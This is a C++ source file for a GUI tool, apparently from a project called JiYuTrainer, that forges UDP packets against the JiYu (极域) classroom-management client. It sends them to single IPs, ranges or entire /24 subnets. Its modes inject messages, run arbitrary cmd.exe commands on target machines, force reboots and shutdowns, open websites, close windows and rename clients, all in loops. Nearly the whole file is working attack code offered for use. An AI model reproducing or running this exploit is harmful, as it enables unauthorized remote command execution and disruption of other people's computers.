#include "stdafx.h"
#include "UdpAttackWindow.h"
#include "resource.h"
#include "UdpAttackTemplates.h"
#include "../JiYuTrainer/StringHlp.h"
#include <string>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

UdpAttackWindow::UdpAttackWindow(HWND parentHWnd) :
	CommonWindow(parentHWnd, 560, 520,
		L"JiYuTrainerUdpAttackWindow", L"极域UDP攻击",
		IDR_HTML_UDPATTACK)
{
	init();
	Show();
}

UdpAttackWindow::~UdpAttackWindow()
{
}

bool UdpAttackWindow::on_event(HELEMENT he, HELEMENT target, BEHAVIOR_EVENTS type, UINT_PTR reason)
{
	sciter::dom::element ele(he);
	if (type == HYPERLINK_CLICK || type == BUTTON_CLICK)
	{
		sciter::string id = ele.get_attribute("id");
		if (id == L"btn_send")
			OnSend();
		else if (id == L"btn_clearlog")
			OnClearLog();
	}
	return false;
}

LRESULT UdpAttackWindow::onWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, BOOL* handled)
{
	switch (message)
	{
	case WM_MY_FORCE_HIDE: {
		Hide();
		*handled = TRUE;
		return 0;
	}
	default:
		return 0;
	}
}

void UdpAttackWindow::Log(const std::wstring& msg)
{
	currentLog += msg + L"\r\n";
	if (text_log.is_valid())
		text_log.set_text(currentLog.c_str());
}

void UdpAttackWindow::OnClearLog()
{
	currentLog = L"";
	if (text_log.is_valid())
		text_log.set_text(L"");
}

std::vector<std::wstring> UdpAttackWindow::ParseIP(const std::wstring& input)
{
	std::vector<std::wstring> result;
	if (input.find(L".") == std::wstring::npos)
		return result;

	if (input.find(L"-") != std::wstring::npos)
	{
		// IP范围: 192.168.1.10-50
		size_t dash = input.find(L"-");
		std::wstring base = input.substr(0, dash);
		int endIP = _wtoi(input.substr(dash + 1).c_str());
		if (endIP > 254) endIP = 254;
		size_t lastDot = base.find_last_of(L".");
		std::wstring prefix = base.substr(0, lastDot + 1);
		int startIP = _wtoi(base.substr(lastDot + 1).c_str());
		for (int i = startIP; i <= endIP; i++)
		{
			result.push_back(prefix + std::to_wstring(i));
		}
	}
	else if (input.find(L"/24") != std::wstring::npos)
	{
		// C段: 192.168.1.1/24
		size_t slash = input.find(L"/");
		std::wstring base = input.substr(0, slash);
		size_t lastDot = base.find_last_of(L".");
		std::wstring prefix = base.substr(0, lastDot + 1);
		for (int i = 1; i <= 254; i++)
		{
			result.push_back(prefix + std::to_wstring(i));
		}
	}
	else
	{
		// 单IP
		result.push_back(input);
	}
	return result;
}

std::vector<unsigned char> UdpAttackWindow::BuildMsgPacket(const std::wstring& msg)
{
	std::vector<unsigned char> packet(MSG_TEMPLATE, MSG_TEMPLATE + sizeof(MSG_TEMPLATE));
	int index = 56;
	for (wchar_t ch : msg)
	{
		if (index + 1 >= (int)packet.size()) break;
		packet[index++] = (unsigned char)(ch & 0xFF);
		packet[index++] = (unsigned char)((ch >> 8) & 0xFF);
	}
	return packet;
}

std::vector<unsigned char> UdpAttackWindow::BuildCmdPacket(const std::wstring& cmd)
{
	std::vector<unsigned char> packet(CMD_TEMPLATE, CMD_TEMPLATE + sizeof(CMD_TEMPLATE));
	// 命令模板：cmd.exe在偏移100，/c 在偏移572，用户命令从偏移578开始
	int index = 578;
	for (wchar_t ch : cmd)
	{
		if (index + 1 >= (int)packet.size()) break;
		packet[index++] = (unsigned char)(ch & 0xFF);
		packet[index++] = (unsigned char)((ch >> 8) & 0xFF);
	}
	return packet;
}

std::vector<unsigned char> UdpAttackWindow::FormatUtf16(const std::wstring& str, int maxBytes)
{
	std::vector<unsigned char> result(maxBytes, 0);
	int byteLen = (int)str.length() * 2;
	if (byteLen > maxBytes) byteLen = maxBytes;
	for (int i = 0; i < (int)str.length() && i * 2 < maxBytes; i++)
	{
		result[i * 2] = (unsigned char)(str[i] & 0xFF);
		result[i * 2 + 1] = (unsigned char)((str[i] >> 8) & 0xFF);
	}
	return result;
}

std::vector<unsigned char> UdpAttackWindow::BuildWebsitePacket(const std::wstring& url)
{
	// 参考 Jiyu_replay_attack packet.py pkg_website
	std::vector<unsigned char> urlData;
	for (wchar_t ch : url)
	{
		urlData.push_back((unsigned char)(ch & 0xFF));
		urlData.push_back((unsigned char)((ch >> 8) & 0xFF));
	}
	int dataLen = (int)urlData.size();
	int totalLen = 8 + 4 + 16 + 8 + 4 + 4 + 16 + dataLen + 4;
	std::vector<unsigned char> packet(totalLen, 0);
	int pos = 0;
	// magic + version
	packet[pos++] = 0x44; packet[pos++] = 0x4d; packet[pos++] = 0x4f; packet[pos++] = 0x43;
	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x01; packet[pos++] = 0x00;
	// size+36 little endian
	int sz = dataLen + 36;
	packet[pos++] = sz & 0xFF; packet[pos++] = (sz >> 8) & 0xFF;
	packet[pos++] = (sz >> 16) & 0xFF; packet[pos++] = (sz >> 24) & 0xFF;
	// 16 random bytes (use fixed for simplicity)
	for (int i = 0; i < 16; i++) packet[pos++] = (unsigned char)(rand() & 0xFF);
	// fixed 8 bytes
	packet[pos++] = 0x20; packet[pos++] = 0x4e; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0xc0; packet[pos++] = 0xa8; packet[pos++] = 0xe9; packet[pos++] = 0x01;
	// size+23 * 2
	sz = dataLen + 23;
	packet[pos++] = sz & 0xFF; packet[pos++] = (sz >> 8) & 0xFF;
	packet[pos++] = (sz >> 16) & 0xFF; packet[pos++] = (sz >> 24) & 0xFF;
	packet[pos++] = sz & 0xFF; packet[pos++] = (sz >> 8) & 0xFF;
	packet[pos++] = (sz >> 16) & 0xFF; packet[pos++] = (sz >> 24) & 0xFF;
	// fixed 16 bytes
	packet[pos++] = 0x00; packet[pos++] = 0x02; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0x18; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
	// url data
	memcpy(packet.data() + pos, urlData.data(), dataLen);
	pos += dataLen;
	// 4 bytes zero
	return packet;
}

std::vector<unsigned char> UdpAttackWindow::BuildCloseWindowsPacket()
{
	// 参考 packet.py pkg_close_windows，582字节，与reboot类似但cmd=0x0200
	std::vector<unsigned char> packet(REBOOT_TEMPLATE, REBOOT_TEMPLATE + sizeof(REBOOT_TEMPLATE));
	// 修改 cmd 字段：reboot是0x1300，close_windows是0x0200
	// 偏移44-45是cmd字段
	packet[44] = 0x02;
	packet[45] = 0x00;
	return packet;
}

std::vector<unsigned char> UdpAttackWindow::BuildCloseTopWindowPacket()
{
	// 参考 packet.py pkg_close_top_window，906字节
	std::vector<unsigned char> packet(906, 0);
	int pos = 0;
	// head: DMOC + version + cmd(0x6e03) + 16 random + 28 fixed
	packet[pos++] = 0x44; packet[pos++] = 0x4d; packet[pos++] = 0x4f; packet[pos++] = 0x43;
	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x01; packet[pos++] = 0x00;
	packet[pos++] = 0x6e; packet[pos++] = 0x03; packet[pos++] = 0x00; packet[pos++] = 0x00;
	for (int i = 0; i < 16; i++) packet[pos++] = (unsigned char)(rand() & 0xFF);
	// 28 bytes fixed
	packet[pos++] = 0x20; packet[pos++] = 0x4e; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0xc0; packet[pos++] = 0xa8; packet[pos++] = 0x01; packet[pos++] = 0x9b;
	packet[pos++] = 0x61; packet[pos++] = 0x03; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0x61; packet[pos++] = 0x03; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0x00; packet[pos++] = 0x02; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
	packet[pos++] = 0x0e; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
	// rest 850 bytes zero
	return packet;
}

std::vector<unsigned char> UdpAttackWindow::BuildRenamePacket(const std::wstring& name, int nameId)
{
	// 参考 packet.py pkg_rename，96字节，GCMN魔数
	std::vector<unsigned char> packet(96, 0);
	int pos = 0;
	// head: GCMN + version + size(0x44) + 16 bytes GUID + 4 bytes name_id
	packet[pos++] = 0x47; packet[pos++] = 0x43; packet[pos++] = 0x4d; packet[pos++] = 0x4e;
	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x01; packet[pos++] = 0x00;
	packet[pos++] = 0x44; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
	// 16 bytes fixed GUID (from packet.py)
	unsigned char guid[16] = {0x66,0xb1,0xe4,0x92,0x3f,0x9a,0x36,0x4a,0x94,0x3a,0x3d,0xa3,0xbd,0x97,0x60,0x41};
	memcpy(packet.data() + pos, guid, 16);
	pos += 16;
	// name_id little endian
	packet[pos++] = nameId & 0xFF;
	packet[pos++] = (nameId >> 8) & 0xFF;
	packet[pos++] = (nameId >> 16) & 0xFF;
	packet[pos++] = (nameId >> 24) & 0xFF;
	// name (utf-16le, null terminated, max 64 bytes)
	std::wstring fullName = name + L"\x00";
	auto nameData = FormatUtf16(fullName, 64);
	memcpy(packet.data() + pos, nameData.data(), 64);
	return packet;
}

bool UdpAttackWindow::SendUdp(const std::wstring& ip, int port, const std::vector<unsigned char>& data)
{
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == INVALID_SOCKET) return false;

	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons((u_short)port);
	char* ipUtf8 = StringHlp::UnicodeToUtf8(ip.c_str());
	inet_pton(AF_INET, ipUtf8, &addr.sin_addr);
	StringHlp::FreeStringPtr(ipUtf8);

	int ret = sendto(sock, (const char*)data.data(), (int)data.size(), 0, (sockaddr*)&addr, sizeof(addr));
	closesocket(sock);
	return ret != SOCKET_ERROR;
}

void UdpAttackWindow::OnSend()
{
	std::wstring ipStr = input_ip.get_value().to_string();
	int port = _wtoi(input_port.get_value().to_string().c_str());
	if (port <= 0) port = 4705;
	int modeIdx = select_mode.get_value().get(0);
	std::wstring mode;
	switch (modeIdx) {
	case 0: mode = L"msg"; break;
	case 1: mode = L"cmd"; break;
	case 2: mode = L"reboot"; break;
	case 3: mode = L"shutdown"; break;
	default: mode = L"msg"; break;
	}
	std::wstring content = input_content.get_value().to_string();
	int loopCount = _wtoi(input_loop.get_value().to_string().c_str());
	if (loopCount <= 0) loopCount = 1;
	int interval = _wtoi(input_interval.get_value().to_string().c_str());
	if (interval <= 0) interval = 0;

	if (ipStr.empty())
	{
		Log(L"[-] 请输入目标IP地址");
		return;
	}

	std::vector<std::wstring> targets = ParseIP(ipStr);
	if (targets.empty())
	{
		Log(L"[-] IP地址格式错误");
		return;
	}

	Log(L"[*] 目标数量: " + std::to_wstring(targets.size()));
	Log(L"[*] 攻击模式: " + mode);

	// 初始化Winsock
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	for (int t = 0; t < loopCount; t++)
	{
		for (const auto& target : targets)
		{
			bool ok = false;
			if (mode == L"msg")
			{
				if (content.empty()) { Log(L"[-] 请输入消息内容"); continue; }
				auto pkt = BuildMsgPacket(content);
				ok = SendUdp(target, port, pkt);
			}
			else if (mode == L"cmd")
			{
				if (content.empty()) { Log(L"[-] 请输入命令内容"); continue; }
				auto pkt = BuildCmdPacket(content);
				ok = SendUdp(target, port, pkt);
			}
			else if (mode == L"reboot")
			{
				std::vector<unsigned char> pkt(REBOOT_TEMPLATE, REBOOT_TEMPLATE + sizeof(REBOOT_TEMPLATE));
				ok = SendUdp(target, port, pkt);
			}
			else if (mode == L"shutdown")
			{
				std::vector<unsigned char> pkt(SHUTDOWN_TEMPLATE, SHUTDOWN_TEMPLATE + sizeof(SHUTDOWN_TEMPLATE));
				ok = SendUdp(target, port, pkt);
			}

			if (ok)
				Log(L"[+] " + target + L" 发送成功");
			else
				Log(L"[-] " + target + L" 发送失败");
		}
		if (loopCount > 1 && t < loopCount - 1)
		{
			Log(L"[*] 等待 " + std::to_wstring(interval) + L" 秒后继续...");
			Sleep(interval * 1000);
		}
	}

	WSACleanup();
	Log(L"[*] 攻击完成");
}

sciter::value UdpAttackWindow::docunmentComplete()
{
	CommonWindow::docunmentComplete();

	sciter::dom::element root = get_root();
	input_ip = root.get_element_by_id(L"input_ip");
	input_port = root.get_element_by_id(L"input_port");
	select_mode = root.get_element_by_id(L"select_mode");
	input_content = root.get_element_by_id(L"input_content");
	input_loop = root.get_element_by_id(L"input_loop");
	input_interval = root.get_element_by_id(L"input_interval");
	btn_send = root.get_element_by_id(L"btn_send");
	btn_clear = root.get_element_by_id(L"btn_clearlog");
	text_log = root.get_element_by_id(L"text_log");

	return sciter::value(true);
}
